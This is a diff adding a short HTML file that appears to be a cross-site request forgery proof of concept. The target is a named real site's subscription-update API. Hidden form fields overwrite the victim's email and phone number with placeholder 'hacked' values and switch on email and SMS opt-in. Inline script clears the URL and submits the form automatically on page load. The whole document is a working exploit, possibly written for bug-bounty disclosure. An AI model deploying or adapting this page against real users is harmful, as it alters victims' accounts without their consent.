@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <form action="https://insurify.com/api/users/update_subscriptions/" method="POST">
+      <input type="hidden" name="email" value="hacked&#64;hacked&#46;com" />
+      <input type="hidden" name="phone&#95;number" value="&#40;555&#41;&#32;555&#45;5555" />
+      <input type="hidden" name="email&#95;optin" value="true" />
+      <input type="hidden" name="sms&#95;optin" value="true" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
